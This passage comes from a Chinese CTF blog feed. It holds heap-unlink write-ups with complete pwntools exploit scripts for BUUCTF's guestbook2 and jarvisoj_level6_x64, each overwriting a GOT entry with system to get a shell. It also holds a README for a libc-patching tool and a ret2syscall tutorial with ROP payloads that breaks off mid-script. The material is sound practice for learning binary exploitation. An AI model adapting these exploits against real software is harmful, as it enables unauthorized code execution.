src="../img/2706180-20220901220954399-696534232.png" alt=""></p><p>而在show函数中，对堆块的标志位进行了检查，如果堆块被释放的话，是无法打印出来里面的内容的。但如果我们再将chunk1和chunk3申请出来并写入八字节的数据的话，此时的标志位为1，可以用show函数打印其中的数据，因为输入数据时，没有加上\x00来截断字符串，因此可以将位于unsorted bin中bk指针给泄露出来。(如下)</p><p><img src="../img/2706180-20220901221010360-996685723.png" alt=""></p><p>此时我们的exp为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br></pre></td></tr></table></figure><p>此时，我们已经拿到了堆地址和libc地址。也就是使用unlink时，那个ptr我们已经有了。因此接下来我们就要伪造堆块的prev_size和size。</p><h3 id="unlink">unlink</h3><p>首先我们需要构造一个fake chunk。其size为0x81 prev_size为0，然后构造一个ptr-0x18和ptr-0x10。ptr为&amp;chunk1的地址。接下来填充垃圾字符，直到原本之前chunk2的位置，然后覆盖已经被释放掉的chunk2的prev_size为0x80(需要和fake chunk的size一样)，而size要为0x90(因为至少要为0x90大于fastbin的范围，否则无法合并，而本题又只能申请跟0x80对齐的size，因此最小满足条件的size就是0x90)。如果是寻常unlink的话，到这里就ok了，因为我们是溢出修改的size，只要<strong>不破坏原本的堆块布局(就是要确保根据我们篡改的size还能够正常的找到top chunk)</strong>，就好了。但是这道题我们并不是溢出，而且没有做一个防止合并的堆块,如果就这样写完的话，释放掉引线堆块，它会和top chunk合并，因此我们需要再写入一定的垃圾数据，然后再布置一个chunk头，这个chunk头的目的就是去做一个防止和top chunk合并的堆块。<strong>而这个chunk头的size不能乱写，必须要保证能根据这个size找到top chunk的地址。</strong></p><p>因此这里的布局后的payload应该如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)<span class="comment">#先将这四个堆块全部释放，为之后覆写堆块中的size和prev_size做准备</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>此时堆块的布局如下：</p><p><img src="../img/2706180-20220901221028228-242800843.png" alt=""></p><p>切记，防止合并堆块的size也很重要，必须要让堆块的地址加上size为top chunk的地址。</p><p>然后我们再次释放引线堆块(因为这个堆块已经被释放过了，所以我们要再释放一次)，触发unlink合并。&amp;fake-0x18这个地址被写入大堆块中。</p><p>unlink后的大堆块中的数据如下：</p><p><img src="../img/2706180-20220901221041013-1426029960.png" alt=""></p><p>此时再编辑chunk0就可以修改大堆块中存放的chunk地址了，我们修改atoi的got表，写入system函数地址即可。</p><p>最后一点需要注意的就是，edit函数写入atoi的got表时，<strong>顺便篡改一下堆块大小为八字节，不然的话再写入0x120的数据会篡改掉其他函数的got表导致程序崩溃</strong>。</p><h2 id="EXP">EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26866&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x4010EC</span></span><br><span class="line">d_a=<span class="number">0x4010D4</span></span><br><span class="line">d_e=<span class="number">0x4010E0</span></span><br><span class="line">d_s=<span class="number">0x4010C8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of new post: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your post: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Post number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of post: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your post: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Post number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">leak_libc=u64_recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x0000000000045390</span><span class="comment">#libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#debug(p,d_a,d_s,d_e,d_d)</span></span><br><span class="line">ptr=heap_addr-<span class="number">0x1910</span></span><br><span class="line">log_addr(<span class="string">&#x27;ptr&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)    </span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,payload.ljust(<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220901221159452-2068743496.png" alt=""></p><h2 id="jarvisoj-level6-x64的exp">jarvisoj_level6_x64的exp</h2><p>这道题和guestbook2这道题一模一样(除了交互)</p><p>直接贴下exp：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28822</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x4010EC</span></span><br><span class="line">d_a=<span class="number">0x4010D4</span></span><br><span class="line">d_e=<span class="number">0x4010E0</span></span><br><span class="line">d_s=<span class="number">0x4010C8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of new note: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your note: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of note: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your note: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;t&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;tttttttt&#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#heap_addr=u64(p.recv(3).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#u64_recv_libc()</span></span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+<span class="number">0x0000000000045390</span><span class="comment">#+libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">ptr=heap_addr-<span class="number">0x1910</span><span class="comment">#0x18f8</span></span><br><span class="line">log_addr(<span class="string">&#x27;ptr&#x27;</span>)</span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x81</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,payload.ljust(<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line"><span class="comment">#debug(p,d_d,d_s,d_a,d_e,0x4008A6)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220901221215153-1898287042.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>patchup--命令行小工具</title>
      <link href="/posts/853f1673.html"/>
      <url>/posts/853f1673.html</url>
      
        <content type="html"><![CDATA[<h1>patchup</h1><h2 id="前言">前言</h2><p>该工具是我自用的一个小工具（针对于做pwn题的辅助工具）（本工具的实现非常简单，而且这个工具的核心是依赖patchelf和glibc-all-in-one这两个工具），用于快速修改本地<code>ELF</code>文件的libc使其与远程服务器那边所运行的程序依赖的<code>libc</code>库一样<br>从而避免了因为 <code>libc</code> 问题，而导致本地打通了但是远程没打通的尴尬情况。因为每次都手动 <code>patch libc</code> 的过程太过于重复，而且有概率出错，同时受到了<br><code>roderick</code> 师傅写的 <code>pwncli</code> 的启发，于是就有自己写一个命令行工具的想法。<br>如果你想看施工现场，请见 <a href="https://github.com/ZIKH26/patchup">github仓库</a></p><h2 id="部署">部署</h2><p>由于这个小工具依赖的核心依然是 <code>patchelf</code> 和 <code>glibc-all-in-one</code> ，能让它以命令行工具的身份出现，还少不了python中的 <code>click</code> 模块。<br>因此你应该有如下东西 <code>patchelf</code>   <code>glibc-all-in-one</code> ，如果有的话请直接看下面的 <a href="#install-patchup">install patchup</a> 部分，如果没有的话下文就是相关部署。</p><h3 id="install-patchelf">install patchelf</h3><h4 id="直接使用预编译的二进制文件">直接使用预编译的二进制文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/NixOS/patchelf/releases/download/0.14.5/patchelf-0.14.5-x86_64.tar.gz</span><br><span class="line">tar -xzvf patchelf-0.14.5-x86_64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">sudo <span class="built_in">mv</span> patchelf /bin/patchelf</span><br></pre></td></tr></table></figure><h4 id="手动编译-patchelf">手动编译 patchelf</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br><span class="line"><span class="comment"># 安装autoreconf</span></span><br><span class="line">sudo apt install -y autoconf</span><br><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x bootstrap.sh</span><br><span class="line"><span class="comment"># 使用预设脚本配置编译环境</span></span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="install-glibc-all-in-one">install glibc-all-in-one</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one</span><br><span class="line"><span class="built_in">mkdir</span> libs</span><br><span class="line"><span class="built_in">chmod</span> +x  extract  update_list download</span><br><span class="line">./update_list</span><br></pre></td></tr></table></figure><p>cd 到上级目录</p><h2 id="install-patchup">install patchup</h2><p>ok，假设你现在有了 <code>patchelf</code> 和 <code>glibc-all-in-one</code>  那么你就可以输入以下命令来安装 <code>patchup</code> 这个小工具了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/polishing-labs/patchup.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> patchup</span><br><span class="line"></span><br><span class="line">sudo pip install --editable .</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以输入patchup --help命令查看帮助，如果出现下面图片所展示的内容，则说明安装成功。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchup --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><img width="544" alt="image" src="https://user-images.githubusercontent.com/93199623/168457093-d3019f95-8ec7-4dd1-bea6-ea7222e77533.png"><p>最后目录结构应该如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glibc-all-in-one（目录）</span><br><span class="line">patchelf（目录）</span><br><span class="line">patchup</span><br><span class="line">├── patchup.py(仓库文件)</span><br><span class="line">└── setup.py(仓库文件</span><br></pre></td></tr></table></figure><h2 id="示例">示例</h2><p>假设你有一个 名为 <code>demo</code>  ELF 文件,他现在默认的 <code>libc</code> 库是 <code>2.27</code> 的，但是服务器那边的这个程序所依赖的 <code>libc</code> 库是2.23的<br>那么你就可以使用以下命令，去为你的ELF文件patch一个 <code>2.23</code> 的 <code>libc</code> 库。（<code>-b</code> 是备份的意思，建议每次使用 <code>patchup</code> 时都开启该选项,<code>-c</code>是自主选择小版本libc的选项，开启这个选项你可以选择小版本不同的<code>2.23</code>的<code>libc</code>库，如果不开启，则默认是匹配到2.23版本的第一个<code>libc</code>库）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchup demo 2.23 -b</span><br></pre></td></tr></table></figure><img width="965" alt="image" src="https://user-images.githubusercontent.com/93199623/167239931-d6266ea8-5ee6-4dde-9037-a20ae9e73069.png"><h3 id="glibc-all-in-one中没有所需要的libc">glibc-all-in-one中没有所需要的libc</h3><p>假设你的 <code>glibc-all-in-one</code> 中空空如也（没有所需要的libc版本），别担心，你依旧可以输入上面的命令。<code>patchup</code> 将会为你自动下载（如果你需要的话）效果如下：<br><img width="1149" alt="image" src="https://user-images.githubusercontent.com/93199623/167242074-a6b3d411-af5d-4444-b9f4-acec16667e94.png"></p><p>此时 <code>match_libc_success_match</code> 展示了当前可以下载的libc版本，你可以输入下面索引来选择它们（第一个索引是0，第二个索引是1，以此类推）<br><img width="1145" alt="image" src="https://user-images.githubusercontent.com/93199623/167242133-464207ad-6416-4cc1-859f-32ebca40ff7b.png"><br>等待下载成功后，将自动进行 <code>patch</code>（如果不想下载的话，可以输入q退出）</p><h3 id="使用题目指定的libc库">使用题目指定的libc库</h3><p>如果题目给定了一个libc库，别担心 <code>patchup</code> 依旧会正常工作，<code>patchup</code> 将会去寻找相应匹配的 <code>ld</code>，如果有的话则会直接链接，<br><img width="966" alt="image" src="https://user-images.githubusercontent.com/93199623/167242830-9cf871bb-e025-4c51-9fca-c3d78f462924.png"></p><p>没有的话则会自动下载（如果你需要的话），如下图<br><img width="1150" alt="image" src="https://user-images.githubusercontent.com/93199623/167242865-c6a01d64-1c9f-415b-aa18-5428821d0a15.png"></p><p>值得一提的就是，我碰见过使用<code>patchup</code>之后<code>patch</code>指定<code>libc</code>是失败的，不过我检查了一下发现这并不是<code>patchup</code>的问题，应该是<code>patchelf</code>出了点<code>bug</code>，所以碰到这种情况，可以换成<code>glibc-all-in-one</code>中版本一样的<code>libc</code>库试试。</p><h2 id="Thanks">Thanks</h2><p>尽管本工具异常的简单，但是对于我这个不太聪明的大一学生来说，写的过程也并不一帆风顺。感谢 Roderick 师傅带给我的启发以及解答一些我的困惑，也感谢我的队员 <a href="www.timochan.cn">Timochan</a> , 如果没有他，关于这个工具在其他主机上的一些环境部署我可能无法实现</p>]]></content>
      
      
      <categories>
          
          <category> 尝试开发小工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 编程 </tag>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2syscall的做题思路</title>
      <link href="/posts/10ff9a38.html"/>
      <url>/posts/10ff9a38.html</url>
      
        <content type="html"><![CDATA[<p>​ret2syscall需要寻找的指令的思路和构造shellcode的思路是一样的，只不过ret2syscall获取的指令算是就地取材，而ret2shellcode创造指令算是无中生有。在32位程序中，我们要系统调用，那就需要把系统调用号传入eax寄存器，然后需要把ecx和edx的寄存器给清空。最后就是需要去把参数/bin/sh的地址存入ebx寄存器。而我感觉ret2syscall的难点也就是在最后这个把参数地址存入ebx寄存器这里了。</p><h1>怎么把参数/bin/sh写入程序中？写到哪？</h1><h2 id="①写到哪">①写到哪</h2><p>首先回答写到哪，<strong>我们要尽可能写到bss段</strong>，因为在不开pie的情况下，<strong>bss段的地址是不会变的</strong>，这意味着，我们可以用IDA看一下bss段的地址然后选定一个我们写入参数的地址，然后我们exp就可以直接写上这个地址了。但是如果我们想写到栈里面，确实用gdb也可以看到写在了哪个内存单元里面，但是这个地址是会变的，把exp上写入我们刚才用gdb看到的地址。解决办法也有，那就是需要泄露程序的一个内存单元地址，然后利用偏移，来计算出我们存放/bin/sh参数的地址。但是这样多少有点麻烦，并且很多时候，我们是无法泄露程序中的地址的，因此我们选择写到bss段。</p><h2 id="②怎么写">②怎么写</h2><p>再回答第一个问题，怎么写入程序中?目前我遇见了两种题型，分别对应的两种方法。</p><h3 id="怎么写——第一种方法">怎么写——第一种方法</h3><p><strong>第一种方法是去搜索gadget，寻找pop [ecx]这类对地址内容操作的指令</strong>。然后我们利用如下payload可以达到将参数/bin/sh写入bss段。（<em>并且这部分的payload需要放到返回地址处使用</em>）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_[ecx]_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)+p32(pop_[ecx]_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>我先来解释一下这个payload。</p><p>首先pop_ecx_addr指的是pop ecx;ret这个指令的地址   bss_addr指的将参数写入bss段的具体地址</p><p>pop_[ecx]_addr指的是pop dword ptr [ecx];ret这个指令的地址 (这里我写[ecx]是为了方便理解，我记得实际的exp里面，不能使用方括号）（另外这里不一定要是ecx，别的寄存器也可以，这里只是举个例子）然后参数/bin就是我们的参数</p><p><strong>至于这个bss_addr+4是上面bss_addr的地址的衔接，因为参数/bin/sh需要两个内存单元存放，因此在这里将上面的地址加4，就存到了下面的内存单元</strong>。最后的\x00是用来声明字符串的结束。</p><p>下面我画图来演示下这个过程是怎么实现的</p><p><img src="../img/2706180-20220127203642840-2033345372.png" alt=""></p><p><em>但是这样搜寻gadget的手段，是有弊端的，因为有时候程序可能恰好就没有类似于pop [ecx]这样的指令。</em></p><h3 id="怎么写——第二种方法">怎么写——第二种方法</h3><p>因此我们可以用第二种方法，等到可以溢出的时候，用rop，先去把返回地址处放置一个read函数，然后再把/bin/sh写入指定的地址（把该地址放在read函数第二个参数即可）然后再随便找一个连续三次pop的指令（不连续应该也是可以的，反正就要进行三次pop，将read函数的三个参数先从栈顶给弹出来）<br>接着再进行ret2syscall，参数传完了，剩下的只要找些gadget片段进行ret2syscall即可。如果没有read函数的话，理论来说我们是可以系统调用read函数的，但是我试了一下，当用int 0x80来系统调用read函数之后，int 0x80指令的后面不是ret指令，没有办法再去衔接后面的gadget了。不过目前还没有遇见过系统调用read函数再ret2syscall的题目。</p><p>当使用这两种方法其中的一种之后，传参完毕，如此剩下的就是去搜寻我们需要的gadget片段，最后系统调用即可。</p><h2 id="怎么搜寻gadget片段？">怎么搜寻gadget片段？</h2><p>我们需要借助ROPgadget工具，这个需要自行安装，安装完成后。</p><p>比如我们要搜索int 0x80指令的片段输入ROPgadget --binary | grep 'int 0x80’即可，如果要搜索pop eax ; ret指令片段，同理输入ROPgadget --binary | grep 'pop eax ; ret’即可</p><p><img src="../img/2706180-20220127203659117-356770839.png" alt=""></p><p><img src="../img/2706180-20220127203712667-1709918883.png" alt=""></p><p>如此，我们就可以找到对应指令的地址了。</p><p>最后要介绍一下ret2syscall中怎么进行传参。除去/bin/sh这参数的传参方式外（该传参方式上面已经介绍过了），剩下的传参方式很单一，先去找到要传参赋值的寄存器，然后去用ROPgadget搜索pop 寄存器；ret指令片段的地址即可。</p><p>以eax存入11来举例</p><p>构造<code>payload位payload=p32(pop_eax_addr)+p32(11)</code>这样能达到效果的原因是执行pop eax的时候，栈顶就是11，此时就是把栈顶的11给弹进eax里面，即完成了传参。</p><p>掌握了上述这些之后，就可以去完成ret2syscall相关的题目了。</p><h1>两道例题</h1><p>最后拿两道例题来演示一下。</p><p>分别是BUUCTF上的inndy_rop和BUUCTF的cmcc_simplerop，这两道题分别考察了两种写入参数的方法。</p><p>题目链接</p><p>inndy_rop         <a href="https://buuoj.cn/challenges#inndy_rop">BUUCTF在线评测 (buuoj.cn)</a></p><p>cmcc_simplerop     <a href="https://buuoj.cn/challenges#cmcc_simplerop">BUUCTF在线评测 (buuoj.cn)</a></p><p>这里我分别给出wp</p><hr><h2 id="inndy-rop">inndy_rop</h2><p><img src="../img/2706180-20220127203727516-678751435.png" alt=""></p><p>此时看保护还是正常的，但是用IDA就发现不对劲了<br><img src="../img/2706180-20220127203739873-417953413.png" alt=""></p><p><img src="../img/2706180-20220127203751365-839458355.png" alt=""></p><p>上面的那个就是主函数</p><p>先是发现左侧的函数表有很多很多的函数，说明这个程序是静态链接，静态链接就意味着没法去ret2libc了，因为ret2libc本来就是去用动态库里面的系统函数，可是现在没有动态库了，因此就要用ret2syscall</p><p>此时用到上面，我提到的第一种方法将/bin/sh写入bss段</p><p>这里要注意的是搜[ecx]指令地址的时候 要这么搜，要用反斜杠用来转义<br><img src="../img/2706180-20220127203803936-1340958560.png" alt=""></p><p><img src="../img/2706180-20220127203818420-1093356739.png" alt=""></p><p>思路就是系统调用execve，然后把参数/bin/sh写入bss段</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">d=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25149</span>)</span><br><span class="line">d=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">int_0x80_addr=<span 